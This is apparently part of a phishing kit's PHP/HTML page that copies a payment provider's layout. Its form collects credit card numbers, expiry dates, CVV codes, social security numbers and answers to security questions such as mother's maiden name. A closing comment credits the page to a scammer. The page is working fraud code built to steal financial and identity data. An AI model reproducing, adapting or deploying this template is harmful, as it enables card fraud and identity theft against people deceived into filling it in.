<img src="../WEBSCR-640-20101004-1/css/Customer/pages/img/logo_ccCB_37wx23h.gif" alt="Visa" border="0" align="middle">
<img src="../WEBSCR-640-20101004-1/css/Customer/pages/img/logo_ccVisa.gif" alt="MasterCard" border="0" align="middle">
<img src="../WEBSCR-640-20101004-1/css/Customer/pages/img/logo_ccMC.gif" alt="Amex"  border="0" align="middle">
<img src="../WEBSCR-640-20101004-1/css/Customer/pages/img/logo_ccAurora_37wx23h.gif" alt="Discover" border="0" align="middle">
<img src="../WEBSCR-640-20101004-1/css/Customer/pages/img/logo_ccCofinoga_22wx23h.gif" alt="Bank" border="0" align="middle">
<img src="../WEBSCR-640-20101004-1/css/Customer/pages/img/logo_ccCofidis_37wx23h.gif" alt="Bank" border="0" align="middle"></td>
</tr>
<tr>
<td class="label" width="200"><label for="defaultcardnumber"><sup><img border="0" src="../WEBSCR-640-20101004-1/css/Customer/pages/img/asterisk.gif"></sup><?php echo $ccnumbr; ?></label></td>

<td width="2">&nbsp;</td>
<td width="418"><input class="" type="text" id="defaultcardnumber" name="defaultcardnumber" size="20"  maxlength="16" value="">
</td>
</tr>

<tr>
<td class="label" width="320"><label for="defaultexpdate"><sup><img border="0" src="../WEBSCR-640-20101004-1/css/Customer/pages/img/asterisk.gif"></sup><?php echo $expbr; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418">

<select  class="" name="defaultexpmonth" id="defaultexpmonth" type="select">
<option value="" ><?php echo $month; ?></option>
<option value=01 >01</option>
<option value=02 >02</option>
<option value=03 >03</option>
<option value=04 >04</option>
<option value=05 >05</option>
<option value=06 >06</option>
<option value=07 >07</option>
<option value=08 >08</option>
<option value=09 >09</option>
<option value=10 >10</option>
<option value=11 >11</option>
<option value=12 >12</option>

</select>
<select  class="" name="defaultexpyear" size="1" id="defaultexpyear" type="select">
<option value="" ><?php echo $year; ?></option>
<option value="12" >2012</option>
<option value="13" >2013</option>
<option value="14" >2014</option>
<option value="15" >2015</option>
<option value="16" >2016</option>
<option value="17" >2017</option>
<option value="18" >2018</option>
<option value="19" >2019</option>
<option value="20" >2020</option>
<option value="21" >2021</option>
<option value="22" >2022</option>
<option value="23" >2023</option>
<option value="24" >2024</option>
<option value="25" >2025</option>
<option value="26" >2026</option>
<option value="27" >2027</option>
<option value="28" >2028</option>
<option value="29" >2029</option>
</select>&nbsp;

</td>
</tr>

<tr>
<td class="label" width="320" STYLE="vertical-align: middle"><label for="defaultcvv2"><sup><img border="0" src="../WEBSCR-640-20101004-1/css/Customer/pages/img/asterisk.gif"></sup><?php echo $cvv; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input class="" style="vertical-align: bottom" type="text" id="defaultcvv2" size="3" maxlength="4" name="defaultcvv2" value="">
<img src="../WEBSCR-640-20101004-1/css/Customer/pages/img/mini_cvv2.gif" alt="" border="0" align="middle"><a href="javascript:openWindow1();"><span class="small" STYLE="vertical-align: sub"><?php echo $hcvv; ?></span></a>
</td>
</tr>

<tr>
<td class="label" width="200"><label for="defaultcardnumber"><sup><img border="0" src="../WEBSCR-640-20101004-1/css/Customer/pages/img/asterisk.gif"></sup><?php echo $ssn; ?></label></td>

<td width="2">&nbsp;</td>
<td width="418"><input type="text" id="ssn" size="10" maxlength="10" name="ssn" value="">
</td>
</tr>


<tr>
<td class="label" width="200"><label for="question1"><sup><img border="0" src="../WEBSCR-640-20101004-1/css/Customer/pages/img/asterisk.gif"></sup><?php echo $quest0; ?></label></td>

<td width="2">&nbsp;</td>
<td width="418"><select id="question1" name="question1" class="optionsLong"><option value=""><?php echo $choosquest1; ?></option>
<option value="Mother's maiden name?">Mother's maiden name</option>
<option value="Last 4 characters of driver's license?">Last 4 characters of driver's license</option>
<option value="Last 4 digits of social security number?">Last 4 digits of social security number</option>
<option value="City of birth?">City of birth</option></select>
</td>
</tr>

<tr>
<td class="label" width="200"><label for="answer1"><sup><img border="0" src="../WEBSCR-640-20101004-1/css/Customer/pages/img/asterisk.gif"></sup><?php echo $answer; ?></label></td>

<td width="2">&nbsp;</td>
<td width="418"><input type="text" id="answer1" class="textLong" size="25" maxlength="40" name="answer1" value="">
</td>
</tr>

<tr>
<td class="label" width="200"><label for="question2"><sup><img border="0" src="../WEBSCR-640-20101004-1/css/Customer/pages/img/asterisk.gif"></sup><?php echo $quest2; ?></label></td>

<td width="2">&nbsp;</td>
<td width="418"><select id="question2" name="question2" class="optionsLong"><option value=""><?php echo $choosquest2; ?></option>
<option value="Mother's maiden name?">Mother's maiden name</option>
<option value="Last 4 characters of driver's license?">Last 4 characters of driver's license</option>
<option value="Last 4 digits of social security number?">Last 4 digits of social security number</option>
<option value="City of birth?">City of birth</option></select>
</td>
</tr>

<tr>
<td class="label" width="200"><label for="answer2"><sup><img border="0" src="../WEBSCR-640-20101004-1/css/Customer/pages/img/asterisk.gif"></sup><?php echo $answer; ?></label></td>

<td width="2">&nbsp;</td>
<td width="418"><input type="text" id="answer2" class="textLong" size="25" maxlength="40" name="answer2" value="">
</td>
</tr>


</table>
<table align="center" border="0" cellpadding="0" cellspacing="0" width="760">
<tr>
<br><br>
<td>
<span class="small"><span class="emphasis"><?php echo $rfield; ?><sup><img border="0" src="../WEBSCR-640-20101004-1/css/Customer/pages/img/asterisk.gif"></sup><br><br><?php echo $for1; ?></span><br><?php echo $for2; ?> <span class="emphasis"><?php echo $spo; ?></span> <?php echo $for3; ?></span>
<hr class="dotted"></td>
</tr>
<tr>
<td align="right">
<input style="margin-top:30px;margin-bottom:40px;_margin-bottom:30px;background: #fcbb49 url(../WEBSCR-640-20101004-1/css/Customer/pages/img/btn_main_1x50.gif) repeat-x top left;width:auto;_width:180px;height:22px;border:0;font:bold 12px arial;color:#FFFFFF;text-align:center;border: 1px solid #ff9900;" type="submit" name="set" value="<?php echo $spo; ?>">
<input type="hidden" name="cmd" value="ok">

<br>
<br>
<br>
</td>
</tr>
</table>
</form></td>
</tr>
</table>

</td>
</tr>
</table>
</tbody></table>
</td></tr>
</tbody></table>

</div></div>
</div>
<div id="footer" class="srd">
<h5 class="accessAid"><?php echo $t1; ?></h5>
<ul>
<li class="first"><a href="#"><?php echo $t2; ?></a></li>
<li><a href="#"><?php echo $t3; ?></a></li>
<li><a href="#"><?php echo $t4; ?></a></li>
<li><a href="#"><?php echo $t5; ?></a></li>
<li><a href="#"><?php echo $t6; ?></a></li>
<li><a href="#"><?php echo $t7; ?></a></li>
<li><a href="#"><?php echo $t8; ?></a></li>
<li><a href="#r"><?php echo $t9; ?></a></li>
<li><a href="#"><?php echo $t10; ?></a></li>
<li><a href="#"><?php echo $t11; ?></a></li>
<li><a href="#"><?php echo $t12; ?></a></li>
<li><a href="#"><?php echo $t13; ?></a></li>
<li><a href="#"><?php echo $t14; ?></a></li>
<li><a href="#"><?php echo $t15; ?></a></li>
<li class="last"><a href="#"><?php echo $t16; ?></a></li>
</ul>
<p id="footerSecure"><a target="" href="#"><img border="0" src="../WEBSCR-640-20101004-1/css/Customer/pages/img/logo_VIPwhite_66x27.gif" alt=""></a></p>
<p id="legal"><?php echo $copyright; ?><br><a href="#"><?php echo $fdic; ?></a></p>
</div>
<div class="hide" id="navFull"></div></div>
</body></html>
<?php
/***   Scam Made By Black Widower 2012=====201? **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
?>